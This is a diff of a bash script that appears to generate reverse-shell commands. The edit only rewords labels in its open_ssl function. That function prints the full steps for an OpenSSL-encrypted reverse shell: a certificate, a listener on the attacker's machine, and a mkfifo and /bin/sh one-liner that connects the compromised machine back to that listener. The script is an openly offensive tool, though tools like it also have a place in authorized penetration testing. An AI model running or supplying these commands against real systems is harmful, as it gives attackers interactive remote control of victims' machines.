@@ -159,9 +159,9 @@ function telnet(){
 
 function open_ssl(){
 	echo -e "${pos}${Yellow}Open_ssl Reverse Shell:"
-	echo -e "${Color_Off}${Green}On the attacker box: ${Color_Off}openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
-	echo -e "${Green}On The attacking machine:${Color_Off}openssl s_server -quiet -key key.pem -cert cert.pem -port ${Red}$port${Color_Off}"
-	echo -e "${Green}Reverse Shell:${Color_Off}mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${Red}$ipaddr${Color_Off}:${Red}$port${Color_Off} > /tmp/s; rm /tmp/s"
+	echo -e "${Color_Off}${Green}On your machine: ${Color_Off}openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+	echo -e "${Green}On your machine: ${Color_Off}openssl s_server -quiet -key key.pem -cert cert.pem -port ${Red}$port${Color_Off}"
+	echo -e "${Green}Reverse Shell on the compromised machine:${Color_Off}mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${Red}$ipaddr${Color_Off}:${Red}$port${Color_Off} > /tmp/s; rm /tmp/s"
 }
 
 ipaddr=$1
